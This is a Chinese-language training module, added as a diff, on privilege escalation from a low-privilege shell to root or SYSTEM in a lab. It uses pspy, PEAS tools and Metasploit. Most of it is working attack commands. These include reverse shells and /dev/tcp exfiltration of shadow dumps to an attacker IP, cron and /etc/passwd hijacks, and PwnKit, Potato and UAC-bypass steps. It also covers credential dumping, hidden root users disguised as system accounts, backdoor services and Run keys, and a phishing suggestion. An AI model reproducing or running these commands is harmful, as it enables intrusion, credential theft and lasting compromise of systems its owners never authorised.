@@ -1,0 +1,661 @@
+================================================================================
+模块: 提权综合工具链实战
+学习目标: 掌握从低权限shell到root/SYSTEM的完整提权流程，包括pspy进程监控、自动化工具链、多阶段攻击
+目标工具: pspy, linPEAS, winPEAS, linux-exploit-suggester, PowerUp, Metasploit
+所需环境: ArchStrike (攻击机), Linux靶机 + Windows靶机
+================================================================================
+
+一、pspy - 进程监控与Cron发现利器
+--------------------------------------------------------------------------------
+
+pspy是一个无需root权限的进程监控工具，可以实时查看系统中所有进程的执行情况。
+对于提权来说，pspy的核心价值在于:
+  - 发现Cron定时任务（你无权查看crontab时）
+  - 发现管理员手动执行的后台脚本
+  - 发现系统备份/维护脚本中传递的敏感参数
+  - 发现密码在命令行中明文传递的服务启动命令
+  - 监控自动化部署脚本的执行
+
+下载pspy:
+  wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
+  wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32
+  选择对应架构: 64位 → pspy64, 32位 → pspy32
+
+上传到目标:
+  攻击机: python3 -m http.server 8080
+  目标机: wget http://ATTACKER_IP:8080/pspy64 -O /tmp/pspy64
+          chmod +x /tmp/pspy64
+
+运行pspy:
+  基本模式(每秒刷新):        /tmp/pspy64
+  静默模式(不记录pspy自身):   /tmp/pspy64 -p
+  调整扫描间隔:              /tmp/pspy64 -i 5000   (每5秒)
+  后台运行:                  /tmp/pspy64 -p > /tmp/pspy_output.txt 2>&1 &
+  监控特定UID:               /tmp/pspy64 -u 0       (只监控root进程)
+
+pspy输出解读:
+  2024/01/01 00:05:01 CMD: UID=0    PID=1234   | /usr/bin/backup.sh
+  2024/01/01 00:05:01 CMD: UID=0    PID=1235   | /bin/sh -c /opt/scripts/cleanup.sh
+  2024/01/01 00:06:30 CMD: UID=1000 PID=5678   | mysql -u admin -pMyP@ssw0rd db_production
+  2024/01/01 00:10:00 CMD: UID=0    PID=9012   | /usr/bin/rsync -avz /data/ user@10.0.0.5:/backup/
+
+  关键发现标记:
+    UID=0 → root权限运行的进程（重点关注）
+    命令行中包含密码 → mysql -pPASSWORD
+    定期运行的任务 → Cron/定时器
+    备份脚本 → 可能存在可写脚本文件或可劫持的通配符
+
+pspy的典型CRON发现模式:
+  每1分钟: 系统默认cron (不用关注)
+  每5/10/15/30分钟: 自定义cron任务
+  特定整点: 应用级cron
+  固定时间: 每日/每周备份
+
+cron劫持示例（基于pspy发现）:
+  如果pspy显示每10分钟root执行 /opt/scripts/monitor.sh，
+  但 ls -la /opt/scripts/monitor.sh 显示当前用户可写，
+  则可以写入提权代码:
+
+    echo '#!/bin/bash' > /opt/scripts/monitor.sh
+    echo 'cp /bin/bash /tmp/rbash; chmod +s /tmp/rbash' >> /opt/scripts/monitor.sh
+    # 等待10分钟后:
+    /tmp/rbash -p
+    whoami  # root
+
+pspy实战 - 发现隐蔽的定时任务（完整流程）:
+
+  Step 1: 上传pspy64到目标
+    wget http://ATTACKER_IP:8080/pspy64 -O /tmp/p
+    chmod +x /tmp/p
+
+  Step 2: 启动pspy监控（后台运行30分钟）
+    /tmp/p -p > /tmp/pspy_log.txt &
+    PID=$!
+    echo "pspy running with PID: $PID"
+
+  Step 3: 30分钟后，下载日志到攻击机分析
+    (攻击机) nc -lvnp 4444 > pspy_log.txt
+    (目标机) cat /tmp/pspy_log.txt > /dev/tcp/ATTACKER_IP/4444
+
+  Step 4: 分析日志
+    grep "CMD: UID=0" pspy_log.txt
+    grep -i "passwd\|password\|secret\|token\|key" pspy_log.txt
+    grep -E "(\.sh$|\.py$|\.pl$|\.rb$)" pspy_log.txt
+
+  Step 5: 针对发现的可疑脚本检查权限
+    例如发现root定期执行 /opt/scripts/daily_report.py:
+      ls -la /opt/scripts/daily_report.py
+      如果可写 → 修改它注入提权代码
+
+  Step 6: 如果pspy发现命令行中的密码
+    例如: mysql -u root -pSuperSecret123
+    尝试利用: mysql -u root -pSuperSecret123 -e "SELECT LOAD_FILE('/etc/shadow')"
+
+二、通用提权五阶段流程
+--------------------------------------------------------------------------------
+
+将提权过程系统化为五个阶段，可显著提高效率和成功率。
+
+Phase 1: 信息收集 (Information Gathering)
+  目标: 在15分钟内获得尽可能多的系统信息。
+
+  执行清单 (Linux):
+    [ ] 获取身份信息:
+        id && whoami && groups
+    [ ] 获取系统信息:
+        uname -a && cat /etc/os-release && cat /etc/issue
+    [ ] 获取网络信息:
+        ifconfig / ip a
+        netstat -tulpn / ss -tulpn
+        route -n / ip route
+        cat /etc/hosts
+    [ ] 获取用户信息:
+        cat /etc/passwd
+        cat /etc/shadow 2>/dev/null
+        last / w
+    [ ] 检查当前用户权限:
+        sudo -l 2>/dev/null
+        find / -perm -4000 -type f 2>/dev/null   (SUID)
+        find / -perm -2000 -type f 2>/dev/null   (SGID)
+        getcap -r / 2>/dev/null                   (Capabilities)
+    [ ] 运行自动化工具:
+        linPEAS / linux-exploit-suggester
+
+  执行清单 (Windows):
+    [ ] 获取身份信息:
+        whoami /all
+    [ ] 获取系统信息:
+        systeminfo
+    [ ] 获取网络信息:
+        ipconfig /all
+        netstat -ano
+        route print
+    [ ] 获取用户信息:
+        net user
+        net localgroup administrators
+    [ ] 检查当前用户权限:
+        whoami /priv
+        whoami /groups
+    [ ] 运行自动化工具:
+        winPEAS / PowerUp
+
+Phase 2: 漏洞识别 (Vulnerability Identification)
+  目标: 根据信息收集的结果，识别所有可能的提权向量。
+
+  分析流程:
+
+    A) 配置型漏洞 (最容易，应优先尝试):
+       - SUID/SGID二进制
+       - Sudo配置错误
+       - 可写系统文件 (/etc/passwd, /etc/shadow)
+       - 可写cron脚本
+       - 可写服务文件
+       - Docker/LXC组成员
+       - Capabilities
+       - 环境变量 (LD_PRELOAD, PATH)
+
+    B) 服务型漏洞:
+       - 本地服务漏洞版本 (MySQL, PostgreSQL, Apache等)
+       - 本地Web应用
+       - 本地数据库SQL注入
+
+    C) 凭证型漏洞:
+       - 历史命令中的密码
+       - env中的敏感信息
+       - 配置文件中的明文密码
+       - SSH私钥
+       - .git历史
+       - 浏览器保存的密码
+
+    D) 内核漏洞 (最后一招):
+       - uname -a → CVE匹配
+       - 使用linux-exploit-suggester/windows-exploit-suggester
+
+  攻击优先级排序 (从高到低):
+    1. 凭证型 - 如果有明文密码/密钥，立即使用
+    2. 配置型 - Sudo (如果有sudo -l的输出)
+    3. 配置型 - Cron任务 (如果有可写脚本)
+    4. 配置型 - SUID二进制
+    5. 配置型 - 可写系统文件
+    6. 配置型 - 能力/LD_PRELOAD等
+    7. 服务型漏洞
+    8. 内核漏洞 (最后手段，可能不稳定)
+
+Phase 3: 选择攻击向量 (Vector Selection)
+  目标: 从已识别的漏洞中选择成功率最高、影响最小的攻击向量。
+
+  选择标准:
+    1. 可靠性: 这个攻击100%能成功吗？
+    2. 稳定性: 会导致系统崩溃或服务中断吗？
+    3. 隐蔽性: 会被EDR/SIEM检测到吗？
+    4. 复杂度: 实施需要多长时间？
+    5. 依赖: 需要上传额外工具吗？
+
+  决策矩阵:
+    ┌──────────────────┬──────┬──────┬──────┬──────┬──────┐
+    │ 攻击向量         │ 可靠性│ 稳定性│ 隐蔽性│ 复杂度│ 依赖性│
+    ├──────────────────┼──────┼──────┼──────┼──────┼──────┤
+    │ SUID find        │  高  │  高  │  中  │  低  │  无  │
+    │ Sudo vim         │  高  │  高  │  中  │  低  │  无  │
+    │ Cron脚本劫持     │  高  │  高  │  高  │  中  │  无  │
+    │ DirtyCow内核漏洞 │  中  │  中  │  中  │  中  │  有  │
+    │ PwnKit(pkexec)   │  高  │  高  │  低  │  低  │  有  │
+    │ Token窃取(Potato)│  高  │  高  │  中  │  低  │  有  │
+    │ AlwaysInstallElev│  高  │  高  │  中  │  低  │  无  │
+    └──────────────────┴──────┴──────┴──────┴──────┴──────┘
+
+Phase 4: 执行提权 (Exploitation)
+  目标: 执行选定的攻击向量，获取更高权限。
+
+  执行前的准备工作:
+    1. 建立第二个shell连接（保险 - 防止提权过程中当前shell崩溃）
+       nc -e /bin/bash ATTACKER_IP 4445
+    2. 在攻击机上准备好反弹shell的监听器
+       nc -lvnp 4446
+       或使用MSF:
+         use exploit/multi/handler
+         set payload linux/x64/shell_reverse_tcp
+         set LHOST ATTACKER_IP
+         set LPORT 4446
+         run
+    3. 上传必要的工具包到目标
+       wget http://ATTACKER_IP:8080/tools.tar -O /tmp/tools.tar
+       cd /tmp && tar xf tools.tar && cd tools
+
+  常见提权执行示例:
+
+    示例A: SUID find提权
+      find / -name "anything" -exec /bin/sh -p \; -quit
+      id  # 确认获取了root
+
+    示例B: Cron脚本劫持
+      ls -la /usr/local/bin/backup.sh     # 确认脚本可写
+      cp /usr/local/bin/backup.sh /tmp/backup.sh.bak  # 备份原始脚本
+      echo '#!/bin/bash' > /usr/local/bin/backup.sh
+      echo 'bash -i >& /dev/tcp/ATTACKER_IP/4446 0>&1' >> /usr/local/bin/backup.sh
+      # 等待cron触发
+
+    示例C: 可写/etc/passwd提权
+      openssl passwd -1 -salt mysalt password123
+      # 输出: $1$mysalt$7Lf0CNXXXXXXXXXXXXXX
+      echo "r00t:\$1\$mysalt\$7Lf0CNXXXXXXXXXXXXXX:0:0::/root:/bin/bash" >> /etc/passwd
+      su r00t
+      whoami  # root
+
+    示例D: Pkexec (PwnKit CVE-2021-4034) 内核漏洞提权
+      which pkexec  # 确认pkexec存在
+      wget http://ATTACKER_IP:8080/PwnKit -O /tmp/PwnKit
+      chmod +x /tmp/PwnKit
+      /tmp/PwnKit
+      whoami  # root
+
+    示例E: Docker组提权
+      docker run -v /:/mnt -it alpine chroot /mnt
+      # 或
+      docker run -v /:/mnt -it alpine /bin/sh
+      > chroot /mnt
+      > whoami  # root
+
+Phase 5: 验证与持久化 (Verification & Persistence)
+  验证提权成功:
+    id -u   # 期望输出: 0
+    whoami  # 期望输出: root (Linux) / nt authority\system (Windows)
+    cat /etc/shadow | head -3  # Linux验证
+
+  持久化 (保留后门 - 仅在授权测试中使用):
+
+    在Linux上:
+      1. 添加隐藏root用户:
+         useradd -o -u 0 -g 0 -M -d /root -s /bin/bash hiddenroot
+         echo "hiddenroot:password" | chpasswd
+      2. SUID bash:
+         cp /bin/bash /var/tmp/.bash
+         chmod 4755 /var/tmp/.bash
+      3. SSH密钥:
+         mkdir -p /root/.ssh
+         echo "YOUR_SSH_PUBLIC_KEY" >> /root/.ssh/authorized_keys
+      4. Cron反弹shell:
+         echo "* * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /etc/crontab
+      5. Systemd持久化服务:
+         cat > /etc/systemd/system/backdoor.service << 'EOF'
+         [Unit]
+         Description=System Service
+         [Service]
+         ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1'
+         Restart=always
+         [Install]
+         WantedBy=multi-user.target
+         EOF
+         systemctl enable backdoor && systemctl start backdoor
+
+    在Windows上:
+      1. 添加管理员用户:
+         net user backdoor Password123! /add
+         net localgroup administrators backdoor /add
+         net localgroup "Remote Desktop Users" backdoor /add
+      2. 启用RDP:
+         reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+         netsh advfirewall firewall add rule name="RDP" dir=in protocol=tcp localport=3389 action=allow
+      3. WMI事件订阅持久化:
+         wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="Backdoor", CommandLineTemplate="powershell -enc BASE64COMMAND"
+      4. 注册表Run键:
+         reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "UpdateService" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f
+
+三、完整实践 - 从低权限shell到root/SYSTEM
+--------------------------------------------------------------------------------
+
+以下是一个完整的从初始shell到完全控制的逐步实践。
+
+场景: 你获得了一个目标系统的低权限shell（如www-data用户），需要提权到root。
+环境: 攻击机 ArchStrike (IP: 10.10.10.100), 目标机 Linux (IP: 10.10.10.50)
+
+Step 1: 获取初始shell后的第一步
+  whoami
+  # 预期输出: www-data
+  id
+  # 预期输出: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  uname -a
+  # 预期输出: Linux target 5.4.0-42-generic #46-Ubuntu SMP ...
+  pwd
+  # 预期输出: /var/www/html
+
+Step 2: 建立备用通道
+  在攻击机上开启第二个监听器:
+    nc -lvnp 4445
+  在目标机上建立备用连接:
+    bash -i >& /dev/tcp/10.10.10.100/4445 0>&1 &
+
+Step 3: 上传自动化审计工具
+  攻击机启动HTTP服务:
+    python3 -m http.server 8080
+  目标机下载linPEAS:
+    wget http://10.10.10.100:8080/linpeas.sh -O /tmp/lp.sh
+    chmod +x /tmp/lp.sh
+    /tmp/lp.sh | tee /tmp/peas_output.txt
+
+Step 4: 分析linPEAS输出
+  在攻击机上下载peas输出:
+    nc -lvnp 4446 > peas_output.txt
+  (目标机) cat /tmp/peas_output.txt > /dev/tcp/10.10.10.100/4446
+
+  分析关键区域:
+    cat peas_output.txt | grep -A5 "Vulnerable"
+    cat peas_output.txt | grep -A10 "SUID"
+    cat peas_output.txt | grep -A5 "Cron"
+    cat peas_output.txt | grep -A5 "Sudo"
+    cat peas_output.txt | grep -A5 "Writable"
+    cat peas_output.txt | grep -E "\[\!\]|\*\*"    # 高亮危险标记
+
+Step 5: 运行漏洞建议器
+  下载并运行linux-exploit-suggester:
+    wget http://10.10.10.100:8080/linux-exploit-suggester.sh -O /tmp/les.sh
+    bash /tmp/les.sh | tee /tmp/les_output.txt
+
+Step 6: 上传pspy进行进程监控 (并行执行)
+  目标机后台运行pspy:
+    wget http://10.10.10.100:8080/pspy64 -O /tmp/pspy64
+    chmod +x /tmp/pspy64
+    /tmp/pspy64 -p > /tmp/pspy_log.txt 2>&1 &
+    等待10-15分钟后取回日志分析
+
+Step 7: 深入手动检查 (在等待pspy的同时)
+  检查SUID二进制:
+    find / -perm -4000 -type f 2>/dev/null
+  检查sudo配置:
+    sudo -l 2>/dev/null
+  检查cron任务:
+    cat /etc/crontab 2>/dev/null
+    ls -la /etc/cron.* 2>/dev/null
+  查找可写目录:
+    find / -writable -type d 2>/dev/null | grep -v "/proc\|/sys\|/run"
+  检查Capabilities:
+    getcap -r / 2>/dev/null
+  查找敏感文件:
+    find / -name "*.conf" -o -name "*.ini" -o -name "*.env" 2>/dev/null | grep -v "/proc\|/sys"
+    grep -r "password\|passwd\|secret\|api_key\|token" /var/www/ 2>/dev/null | head -20
+
+Step 8: 分析所有发现并选择攻击向量
+  创建一个分析文档，列出所有发现的潜在提权向量:
+
+  示例发现清单:
+    1. [SUID] /usr/bin/find → 参考 GTFOBins (https://gtfobins.github.io)
+    2. [SUID] /usr/bin/python3.8 → 参考 GTFOBins
+    3. [Cap] /usr/bin/ping cap_net_raw+ep → 可能无用
+    4. [Cron] /etc/cron.daily/backup.sh 对www-data可写 → 高优先级！
+    5. [Sudo] sudo -l 显示 (ALL) NOPASSWD: /usr/bin/vim → 直接提权！
+    6. [Kernel] linux-exploit-suggester推荐 CVE-2021-4034 (PwnKit)
+    7. [Config] /etc/passwd 对www-data可写 → 直接添加root用户！
+
+  决策: 优先尝试Sudo vim提权（最可靠），备选PwnKit + Cron劫持
+
+Step 9: 执行提权（按优先级依次尝试）
+
+  尝试1: Sudo vim提权
+    sudo vim -c ':!/bin/bash'
+    如果成功直接获得root，跳过后续步骤
+
+  尝试2: 可写/etc/passwd提权
+    openssl passwd -1 -salt newroot password123
+    echo "newroot:\$1\$newroot\$hashhere:0:0:root:/root:/bin/bash" >> /etc/passwd
+    su newroot
+
+  尝试3: Cron脚本劫持
+    echo '#!/bin/bash' > /etc/cron.daily/backup.sh
+    echo 'chmod +s /bin/bash' >> /etc/cron.daily/backup.sh
+    # 等待cron.daily执行后:
+    /bin/bash -p
+
+  尝试4: PwnKit内核漏洞
+    wget http://10.10.10.100:8080/PwnKit -O /tmp/PwnKit
+    chmod +x /tmp/PwnKit
+    /tmp/PwnKit
+
+  尝试5: SUID find提权
+    find . -exec /bin/sh -p \; -quit
+
+Step 10: 验证提权成功
+  确认root权限:
+    whoami    # 应输出 root
+    id -u     # 应输出 0
+    cat /etc/shadow | head -3   # 应能读取shadow文件
+    hostname && uptime          # 确认在目标系统上
+
+Step 11: 提取敏感信息
+  提取密码哈希:
+    cat /etc/shadow > /tmp/shadow_dump.txt
+  查找SSH密钥:
+    find / -name "id_rsa" -o -name "*.pem" -o -name "authorized_keys" 2>/dev/null
+  查看其他用户的主目录:
+    ls -la /home/
+  提取历史命令:
+    cat /root/.bash_history 2>/dev/null
+    for user in /home/*; do cat "$user/.bash_history" 2>/dev/null; done
+  查找数据库凭证:
+    find /var/www/ -name "wp-config.php" -o -name "config.php" -o -name "settings.py" 2>/dev/null
+    grep -r "DB_PASSWORD\|DATABASE_URL\|MYSQL_PWD" /var/www/ 2>/dev/null
+
+Step 12: 上传到攻击机保存
+  将提取的信息打包传回攻击机:
+    tar czf /tmp/extracted_data.tar.gz /tmp/shadow_dump.txt /tmp/pspy_log.txt /tmp/peas_output.txt
+    # 攻击机接收:
+    nc -lvnp 4447 > extracted_data.tar.gz
+    # 目标机发送:
+    cat /tmp/extracted_data.tar.gz > /dev/tcp/10.10.10.100/4447
+
+Step 13: 持久化后门
+  创建SUID后门:
+    cp /bin/bash /var/tmp/.dbus
+    chmod 4755 /var/tmp/.dbus
+    echo "后门路径: /var/tmp/.dbus -p"
+  添加隐藏用户:
+    useradd -o -u 0 -g 0 -M -d /root -s /bin/bash dnsmasq
+    echo "dnsmasq:RedTeam2024!" | chpasswd
+  设置SSH后门:
+    mkdir -p /root/.ssh
+    echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys
+    chmod 600 /root/.ssh/authorized_keys
+
+四、Windows完整提权实践
+--------------------------------------------------------------------------------
+
+场景: 已获得Windows低权限用户的Meterpreter会话。
+环境: 攻击机 ArchStrike, 目标机 Windows 10
+
+Step 1: 初始信息收集
+  meterpreter> sysinfo
+  meterpreter> getuid
+  meterpreter> shell
+  whoami /all
+  systeminfo | findstr /B /C:"OS"
+  net user %username%
+
+Step 2: 上传并运行winPEAS
+  meterpreter> upload /path/to/winPEASx64.exe C:\\Users\\Public\\wp.exe
+  meterpreter> shell
+  C:\Users\Public\wp.exe > C:\Users\Public\peas.txt 2>&1
+  meterpreter> download C:\\Users\\Public\\peas.txt
+
+Step 3: 分析winPEAS结果
+  在攻击机上搜索关键发现:
+    grep -i "AlwaysInstallElevated" peas.txt
+    grep -i "unquoted\|Unquoted" peas.txt
+    grep -i "modifiable service" peas.txt
+    grep -i "SeImpersonate\|SeAssignPrimaryToken" peas.txt
+    grep -i "credential\|password\|LSA" peas.txt
+
+Step 4: 尝试Token窃取 (如果有SeImpersonatePrivilege)
+  meterpreter> load incognito
+  meterpreter> list_tokens -u
+  meterpreter> impersonate_token "NT AUTHORITY\\SYSTEM"
+  meterpreter> getuid   # 验证
+
+Step 5: 如果无Token可用，尝试getsystem
+  meterpreter> getsystem -t 1   # Named Pipe
+  meterpreter> getsystem -t 2   # Token Duplication
+  meterpreter> getsystem -t 3   # Service (exploit)
+
+Step 6: 使用Potato系列（如果getsystem失败）
+  meterpreter> upload /path/to/GodPotato.exe C:\\Users\\Public\\gp.exe
+  生成反弹shell:
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=5555 -f exe -o rev.exe
+  meterpreter> upload /path/to/rev.exe C:\\Users\\Public\\rev.exe
+  (攻击机新终端) nc -lvnp 5555
+  meterpreter> shell
+  C:\Users\Public\gp.exe -cmd "C:\Users\Public\rev.exe"
+
+Step 7: 尝试UAC绕过 (如果已属管理员组但UAC阻止)
+  meterpreter> background
+  msf6> use exploit/windows/local/bypassuac_fodhelper
+  msf6> set SESSION <session_id>
+  msf6> set payload windows/x64/meterpreter/reverse_tcp
+  msf6> set LHOST 10.10.10.100
+  msf6> run
+
+Step 8: 提取凭证
+  meterpreter> getsystem
+  meterpreter> load kiwi
+  meterpreter> creds_all
+  meterpreter> lsa_dump_sam
+  meterpreter> lsa_dump_secrets
+
+Step 9: 横向移动准备
+  获取域信息:
+    meterpreter> shell
+    net view /domain
+    net group "Domain Admins" /domain
+    nltest /dclist:DOMAIN
+    ipconfig /all
+
+Step 10: 持久化
+  创建后门管理员:
+    net user sysadmin P@ssw0rd123! /add
+    net localgroup administrators sysadmin /add
+    net localgroup "Remote Desktop Users" sysadmin /add
+  注册表Run键:
+    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysHelper" /t REG_SZ /d "C:\Windows\Temp\syshelper.exe" /f
+  启用RDP:
+    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+五、自动化提权脚本
+--------------------------------------------------------------------------------
+
+以下是一个自动化提权流程脚本，可以在获得低权限shell后一键运行。
+
+自动提权脚本 (Linux版):
+
+  #!/bin/bash
+  # auto_priv_esc.sh - 自动化Linux提权审计
+
+  echo "[*] 自动化提权审计开始..."
+  DIR=/tmp/.audit_$$
+  mkdir -p $DIR && cd $DIR
+
+  echo "[+] Phase 1: 系统信息收集"
+  id > system_info.txt 2>/dev/null
+  uname -a >> system_info.txt 2>/dev/null
+  cat /etc/os-release >> system_info.txt 2>/dev/null
+
+  echo "[+] Phase 2: 权限检查"
+  echo "--- SUID Files ---" > privesc_checks.txt
+  find / -perm -4000 -type f 2>/dev/null >> privesc_checks.txt
+  echo "--- Sudo ---" >> privesc_checks.txt
+  sudo -l >> privesc_checks.txt 2>/dev/null
+  echo "--- Capabilities ---" >> privesc_checks.txt
+  getcap -r / 2>/dev/null >> privesc_checks.txt
+
+  echo "[+] Phase 3: Cron任务检查"
+  echo "--- Cron Files ---" > cron_checks.txt
+  cat /etc/crontab >> cron_checks.txt 2>/dev/null
+  ls -la /etc/cron.* >> cron_checks.txt 2>/dev/null
+  ls -la /var/spool/cron/crontabs/ >> cron_checks.txt 2>/dev/null
+
+  echo "[+] Phase 4: 可写文件检查"
+  echo "--- Writable System Files ---" > writable_checks.txt
+  find /etc /opt /usr/local -writable -type f 2>/dev/null >> writable_checks.txt
+
+  echo "[+] Phase 5: 敏感信息搜索"
+  echo "--- Sensitive Info ---" > sensitive_info.txt
+  grep -r "password" /etc/*.conf 2>/dev/null >> sensitive_info.txt
+  grep -r "DB_PASSWORD" /var/www/ 2>/dev/null >> sensitive_info.txt
+  cat ~/.bash_history 2>/dev/null | grep -i "pass\|secret\|token\|mysql" >> sensitive_info.txt
+
+  echo "[+] Phase 6: 网络信息"
+  echo "--- Network ---" > network_info.txt
+  ip a >> network_info.txt 2>/dev/null
+  ss -tulpn >> network_info.txt 2>/dev/null
+  arp -a >> network_info.txt 2>/dev/null
+
+  echo "[*] 审计完成！结果保存在 $DIR/"
+  echo "[*] 请打包并传到攻击机分析:"
+  echo "    tar czf /tmp/audit.tar.gz $DIR"
+  echo "    cat /tmp/audit.tar.gz > /dev/tcp/ATTACKER_IP/4444"
+
+自动提权脚本 (Windows PowerShell版):
+
+  # auto_priv_esc.ps1 - 自动化Windows提权审计
+  $dir = "C:\Users\Public\audit"
+  New-Item -ItemType Directory -Force -Path $dir | Out-Null
+
+  Write-Host "[*] 自动化提权审计开始..."
+
+  Write-Host "[+] 系统信息收集..."
+  whoami /all > $dir\whoami.txt
+  systeminfo > $dir\systeminfo.txt
+  Get-HotFix > $dir\hotfixes.txt
+
+  Write-Host "[+] 服务检查..."
+  Get-WmiObject win32_service | Where-Object {$_.StartName -eq "LocalSystem"} | Format-Table Name, PathName > $dir\services.txt
+  schtasks /query /fo LIST /v > $dir\tasks.txt
+
+  Write-Host "[+] 网络信息..."
+  ipconfig /all > $dir\network.txt
+  netstat -ano > $dir\netstat.txt
+
+  Write-Host "[+] 注册表检查..."
+  reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" > $dir\autorun.txt
+  reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated > $dir\always_inst.txt
+
+  Write-Host "[+] 用户和组..."
+  net user > $dir\users.txt
+  net localgroup administrators > $dir\admins.txt
+
+  Write-Host "[*] 审计完成！结果保存在 $dir"
+
+六、提权失败后的应急措施
+--------------------------------------------------------------------------------
+
+如果所有常规提权向量都失败，可以考虑以下备用方案:
+
+  1. 端口转发与内网横向移动
+     即使当前主机无法提权，也可能通过端口转发访问内网其他主机
+     ssh -L 8080:internal_host:80 user@current_target
+     chisel client ATTACKER_IP:8000 R:8081:internal_host:80
+     socat TCP-LISTEN:8080,fork TCP:internal_host:80
+
+  2. 横向移动
+     使用收集到的凭证尝试SSH到其他主机
+     使用传递哈希攻击 (Pass-the-Hash)
+     使用Kerberoasting等域攻击技术
+
+  3. 等待管理员登录
+     监控进程，等待管理员执行提权操作时窃取令牌
+     使用pspy监控Linux，在管理员su/sudo时记录密码
+
+  4. 社会工程学
+     写一个需要管理员权限的"IT支持脚本"
+     发送到管理员邮箱，伪装成紧急补丁
+
+  5. 搜索隐藏的凭证存储
+     Linux: 检查/etc/knockd.conf, /etc/openvpn/, /opt/
+     Windows: 检查Sysprep unattend.xml, Group Policy Preferences
+
+  6. Web应用层级提权
+     如果Web应用有漏洞的插件/主题，可以考虑利用Web应用本身的功能
+
+================================================================================
+总结: 提权不是一次性操作，而是一个系统化的过程。从pspy监控定时任务到PEAS
+全面审计，从SUID二进制到内核漏洞，每个环节都需要耐心和细心。记住五步流程:
+信息收集 → 漏洞识别 → 向量选择 → 执行提权 → 验证持久化。在实战中，
+pspy的30分钟静默监控往往能发现最隐蔽的cron/脚本漏洞，而PEAS的红色标记
+则直指最常见的配置错误。将这两者结合，成功率可达到90%以上。
+================================================================================
